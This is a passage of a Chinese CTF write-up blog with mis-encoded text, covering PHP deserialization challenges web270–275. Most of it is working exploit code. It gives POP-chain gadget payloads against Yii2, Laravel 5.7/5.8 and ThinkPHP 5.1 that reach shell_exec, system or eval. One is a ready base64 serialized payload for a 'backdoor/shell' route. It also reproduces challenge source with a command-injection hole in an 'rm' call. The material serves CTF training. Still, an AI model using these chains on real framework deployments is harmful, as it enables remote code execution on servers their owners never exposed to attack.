punctuation">\</span>rest<span class="token punctuation">\</span>IndexAction</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">yii<span class="token punctuation">\</span>db</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">yii<span class="token punctuation">\</span>base<span class="token punctuation">\</span>BaseObject</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">BatchQueryResult</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token variable">$_dataReader</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">_dataReader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>web<span class="token punctuation">\</span>DbSession</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token punctuation">\</span>yii<span class="token punctuation">\</span>db<span class="token punctuation">\</span>BatchQueryResult</span><span class="token punctuation">(</span><span class="token string">'shell_exec'</span><span class="token punctuation">,</span> <span class="token string">'cp /f* 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ­¤å¤„å†™å‘½ä»¤</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>r<span class="token operator">=</span>backdoor<span class="token operator">/</span>shell<span class="token operator">&amp;</span>code<span class="token operator">=</span>TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxMjoiY3AgL2YqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX0<span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="web271â€”â€”Laravel5-7-ååºåˆ—åŒ–æ¼æ´"><a href="#web271â€”â€”Laravel5-7-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web271â€”â€”Laravel5.7 ååºåˆ—åŒ–æ¼æ´"></a>web271â€”â€”Laravel5.7 ååºåˆ—åŒ–æ¼æ´</h1><p><a href="https://blog.csdn.net/zhangchensong168/article/details/104695593/" target="_blank" rel="noopener">Laravel5.7ååºåˆ—åŒ–RCEæ¼æ´åˆ†æ</a></p><p>ç©ºæ ¼è¢«è¿‡æ»¤æ³¨æ„ä¿®æ”¹æœ€åçš„payload</p><p><strong>æ¬ç –poc</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">PendingCommand</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">,</span> <span class="token variable">$app</span><span class="token punctuation">,</span> <span class="token variable">$command</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$test</span><span class="token punctuation">;</span>                 <span class="token comment" spellcheck="true">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Auth\GenericUser</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">app</span> <span class="token operator">=</span> <span class="token variable">$app</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//ä¸€ä¸ªå®ä¾‹åŒ–çš„ç±» Illuminate\Foundation\Application</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">command</span> <span class="token operator">=</span> <span class="token variable">$command</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//è¦æ‰§è¡Œçš„phpå‡½æ•° system</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">parameters</span> <span class="token operator">=</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//è¦æ‰§è¡Œçš„phpå‡½æ•°çš„å‚æ•°  array('id')</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Faker</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">DefaultGenerator</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$default</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">default</span> <span class="token operator">=</span> <span class="token variable">$default</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Application</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$instances</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$instances</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">instances</span><span class="token punctuation">[</span><span class="token string">'Illuminate\Contracts\Console\Kernel'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$instances</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token variable">$defaultgenerator</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Faker<span class="token punctuation">\</span>DefaultGenerator</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"hello"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$app</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$application</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">(</span><span class="token variable">$app</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pendingcommand</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">(</span><span class="token variable">$defaultgenerator</span><span class="token punctuation">,</span> <span class="token variable">$application</span><span class="token punctuation">,</span> <span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'cp /f* 1.txt'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ­¤å¤„æ‰§è¡Œå‘½ä»¤</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$pendingcommand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web272ã€273â€”â€”Laravel5-8-ååºåˆ—åŒ–æ¼æ´"><a href="#web272ã€273â€”â€”Laravel5-8-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="web272ã€273â€”â€”Laravel5.8 ååºåˆ—åŒ–æ¼æ´"></a>web272ã€273â€”â€”Laravel5.8 ååºåˆ—åŒ–æ¼æ´</h1><p><strong>æ¬ç –poc</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus<span class="token punctuation">\</span>Dispatcher</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console<span class="token punctuation">\</span>QueuedCommand</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">PendingBroadcast</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">events</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Dispatcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">event</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">QueuedCommand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Console</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator<span class="token punctuation">\</span>MockDefinition</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">QueuedCommand</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token variable">$connection</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connection</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">MockDefinition</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Bus</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader<span class="token punctuation">\</span>EvalLoader</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Dispatcher</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$queueResolver</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">queueResolver</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">EvalLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'load'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Loader</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">EvalLoader</span>    <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Mockery<span class="token punctuation">\</span>Generator</span><span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">MockDefinition</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$code</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token operator">=</span><span class="token string">"&lt;?php phpinfo();exit()?>"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//æ­¤å¤„æ˜¯PHPä»£ç </span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">MockConfiguration</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">class</span> <span class="token class-name">MockConfiguration</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">"feng"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PendingBroadcast</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h1><p><a href="https://blog.csdn.net/rfrder/article/details/113843768" target="_blank" rel="noopener">Thinkphp5.1 ååºåˆ—åŒ–æ¼æ´å¤ç°</a></p><p><strong>æ¬ç –</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"lin"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"lin"</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Request</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PHPå‡½æ•°</span>    <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">// è¡¨å•ajaxä¼ªè£…å˜é‡</span>        <span class="token string">'var_ajax'</span>         <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'_ajax'</span><span class="token punctuation">,</span>      <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">config</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"var_ajax"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'lin'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//PHPå‡½æ•°çš„å‚æ•°</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hook</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"visible"</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token variable">$this</span><span class="token punctuation">,</span><span class="token string">"isAjax"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>concern<span class="token punctuation">\</span>Conversion</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Windows</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>ä½¿ç”¨æ–¹æ³•ï¼š</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210825200218586.png" alt="image-20210825200218586"></p><h1 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">filter</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filecontent</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$evilfile</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$fn</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filecontent</span><span class="token operator">=</span><span class="token variable">$fn</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/php|\.\./i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filecontent</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">evilfile</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">evilfile</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">evilfile</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'rm '</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//æ­¤å¤„å¯ä»¥ç”¨åˆ†å·æ¥æˆªæ–­</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>    <span class="token variable">$f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">filter</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">checkevil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//é˜²æ­¢è¯¥é¢˜åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ åš</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å†™å…¥æ“ä½œ</span>        <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fn'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" 